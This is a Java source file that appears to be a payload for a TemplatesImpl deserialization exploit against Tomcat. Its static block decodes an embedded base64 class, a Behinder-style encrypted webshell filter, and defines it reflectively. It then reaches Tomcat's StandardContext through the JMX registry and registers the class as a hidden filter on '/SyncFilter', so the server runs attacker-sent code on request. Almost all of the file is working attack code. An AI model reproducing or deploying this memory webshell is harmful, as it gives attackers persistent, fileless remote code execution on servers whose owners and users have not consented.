package com.sorry.utils.templatesimpl;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import sun.misc.BASE64Decoder;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Set;


/**
 * created by 0x22cb7139 on 2021/6/29
 */
public class CustomAbstractTranslet_tomcatall extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    static{
        try{
            String filter64="yv66vgAAADQA7AoALwBxCQByAHMIAHQKAHUAdgcAdwcAeAgAeQgAegsABgB7CwAFAHwIAH0KACMAfggAfwsABQCACACBCwCCAIMIAIQKAIUAhgcAhwoAIwCICgATAIkKAIUAigcAiwoAFwBxCACMCwCNAI4IAI8IAJALAAUAkQcAkgoAHgBxCgCTAJQKAB4AlQoAhQCWBwCXCgAjAJgKAC8AmQoAKgCaCACbCgCcAJ0IAJ4HAJ8HAFEJAKAAoQoAKgCiCgCjAKQHAKUKAKAApgoAowCnCgAqAKgKAC8AfgcAqQoANACqCwCrAKwHAK0HAK4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHkxjb20vc29ycnkvYnVnL0JlaGluZGVyRmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAK8BAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAFrAQASTGphdmEvbGFuZy9TdHJpbmc7AQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAC3BhZ2VDb250ZXh0AQAPTGphdmEvdXRpbC9NYXA7AQACYmYBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAA5ldmlsQ2xhc3NCeXRlcwEAAltCAQACc2IBAAtjbGFzc2xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQALZGVmaW5lY2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAFhAQASTGphdmEvbGFuZy9PYmplY3Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQADcnNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEADVN0YWNrTWFwVGFibGUHAHcHAHgHAKkHALABAAdkZXN0cm95AQAKU291cmNlRmlsZQEAE0JlaGluZGVyRmlsdGVyLmphdmEMADkAOgcAsQwAsgCzAQAVRmlsdGVy5Yid5aeL5YyW5Yib5bu6BwC0DAC1ALYBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAZpbmplY3QBAAhtZW1zaGVsbAwAtwC4DAC5ALoBAARQT1NUDAC7ALwBABBmNWQ3YWEzYmE0OTI5Y2MxDAC9AL4BAAF1BwC/DADAAMEBAANBRVMHAMIMAMMAxAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAMUAxgwAOQDHDABAAMgBABFqYXZhL3V0aWwvSGFzaE1hcAEAB3Nlc3Npb24HAMkMAMoAywEAB3JlcXVlc3QBAAhyZXNwb25zZQwAzADNAQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgcAzgwAzwC6DADQANEMANIA0wEAEGphdmEvbGFuZy9TdHJpbmcMADkA1AwA1QDWDADXANgBABVqYXZhLmxhbmcuQ2xhc3NMb2FkZXIHANkMANoA2wEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzBwDcDADdAFgMAN4A3wcA4AwA4QDiAQAQamF2YS9sYW5nL09iamVjdAwA4wDkDADlAOYMAOcA6AEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOkAOgcA6gwARgDrAQAcY29tL3NvcnJ5L2J1Zy9CZWhpbmRlckZpbHRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACXNldEhlYWRlcgEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEACWdldE1ldGhvZAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAA1qYXZhL3V0aWwvTWFwAQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQAFKFtCKVYBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhADcALwABADgAAAAEAAEAOQA6AAEAOwAAAC8AAQABAAAABSq3AAGxAAAAAgA8AAAABgABAAAADAA9AAAADAABAAAABQA+AD8AAAABAEAAQQACADsAAABBAAIAAgAAAAmyAAISA7YABLEAAAACADwAAAAKAAIAAAAPAAgAEAA9AAAAFgACAAAACQA+AD8AAAAAAAkAQgBDAAEARAAAAAQAAQBFAAEARgBHAAIAOwAAApIABgAQAAABMCvAAAU6BCzAAAY6BRkFEgcSCLkACQMAGQS5AAoBABILtgAMmQD6Eg06BhkEuQAOAQASDxkGuQAQAwASEbgAEjoHGQcFuwATWRkGtgAUEhG3ABW2ABa7ABdZtwAYOggZCBIZGQS5AA4BALkAGgMAVxkIEhsZBLkAGgMAVxkIEhwZBbkAGgMAVxkEuQAdAQA6CRkHuwAeWbcAHxkJtgAgtgAhtgAiOgq7ACNZGQq3ACQ6Cyq2ACW2ACY6DCq2ACW2ACYSJ7YAKBIpBr0AKlkDEitTWQSyACxTWQWyACxTtgAtOg0ZDQS2AC4ZDRkMBr0AL1kDGQpTWQQDuAAwU1kFGQq+uAAwU7YAMcAAKjoOGQ62ADI6DxkPGQi2ADNXsacACjoGGQa2ADUtKyy5ADYDALEAAQAXARwBIAA0AAQAPAAAAG4AGwAAABMABgAUAAwAFQAXABcAJgAYACoAGQA6ABoAQQAbAFUAHABeAB0AbwAeAHsAHwCHACAAkAAhAKYAIgCxACMAugAkAOIAJQDoACYBDQAnARQAKAEcACkBHQAtASAAKwEiACwBJwAuAS8ALwA9AAAArAARACoA8wBIAEkABgBBANwASgBLAAcAXgC/AEwATQAIAJAAjQBOAE8ACQCmAHcAUABRAAoAsQBsAFIASQALALoAYwBTAFQADADiADsAVQBWAA0BDQAQAFcAWAAOARQACQBZAFoADwEiAAUAWwBcAAYAAAEwAD4APwAAAAABMABdAF4AAQAAATAAXwBgAAIAAAEwAGEAYgADAAYBKgBjAGQABAAMASQAZQBmAAUAZwAAAAwAAQBeAL8ATABoAAgAaQAAABAAA/0BHQcAagcAa0IHAGwGAEQAAAAGAAIAbQBFAAEAbgA6AAEAOwAAACsAAAABAAAAAbEAAAACADwAAAAGAAEAAAA0AD0AAAAMAAEAAAABAD4APwAAAAEAbwAAAAIAcA==";
            byte[] evil = new BASE64Decoder().decodeBuffer(filter64);
            ClassLoader classloader = Thread.currentThread().getContextClassLoader();
            Method defineclass= classloader.loadClass("java.lang.ClassLoader").getDeclaredMethod("defineClass",byte[].class,Integer.TYPE,Integer.TYPE);
            defineclass.setAccessible(true);
            Class clazz = (Class) defineclass.invoke(classloader,evil,0,evil.length);

            String filterName = "InvokerFilter";
            String urlPattern = "/SyncFilter";
            MBeanServer mBeanServer = Registry.getRegistry(null,null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mBeanServer);
            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(obj);

            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            Iterator<NamedObject> iterator = objectSet.iterator();
            while(iterator.hasNext()) {
                try {
                    DynamicMBean dynamicMBean = iterator.next().getObject();
                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                    field.setAccessible(true);
                    obj = field.get(dynamicMBean);

                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                    field.setAccessible(true);
                    StandardContext standardContext = (StandardContext) field.get(obj);

                    field = standardContext.getClass().getDeclaredField("filterConfigs");
                    field.setAccessible(true);
                    HashMap<String, ApplicationFilterConfig> map = (HashMap<String, ApplicationFilterConfig>) field.get(standardContext);

                    if (map.get(filterName) == null) {
                        System.out.println("[+] Add Dynamic Filter");

                        Class filterDefClass = null;
                        try {
                            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
                        } catch (ClassNotFoundException e) {
                            filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
                        }

                        Object filterDef = filterDefClass.newInstance();
                        filterDef.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterDef, new Object[]{filterName});
                        Filter filter = (Filter) clazz.newInstance();;

                        filterDef.getClass().getDeclaredMethod("setFilterClass", new Class[]{String.class}).invoke(filterDef, new Object[]{filter.getClass().getName()});
                        filterDef.getClass().getDeclaredMethod("setFilter", new Class[]{Filter.class}).invoke(filterDef, new Object[]{filter});
                        standardContext.getClass().getDeclaredMethod("addFilterDef", new Class[]{filterDefClass}).invoke(standardContext, new Object[]{filterDef});

                        Class filterMapClass = null;
                        try {
                            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
                        } catch (ClassNotFoundException e) {
                            filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                        }

                        Object filterMap = filterMapClass.newInstance();
                        filterMap.getClass().getDeclaredMethod("setFilterName", new Class[]{String.class}).invoke(filterMap, new Object[]{filterName});
                        filterMap.getClass().getDeclaredMethod("setDispatcher", new Class[]{String.class}).invoke(filterMap, new Object[]{DispatcherType.REQUEST.name()});
                        filterMap.getClass().getDeclaredMethod("addURLPattern", new Class[]{String.class}).invoke(filterMap, new Object[]{urlPattern});
                        standardContext.getClass().getDeclaredMethod("addFilterMapBefore", new Class[]{filterMapClass}).invoke(standardContext, new Object[]{filterMap});

                        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(new Class[]{Context.class, filterDefClass});
                        constructor.setAccessible(true);
                        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(new Object[]{standardContext, filterDef});
                        map.put(filterName, filterConfig);
                    }
                }catch (Exception e){
                    //
                }
            }

        }catch (Exception e){

        }
    }
}
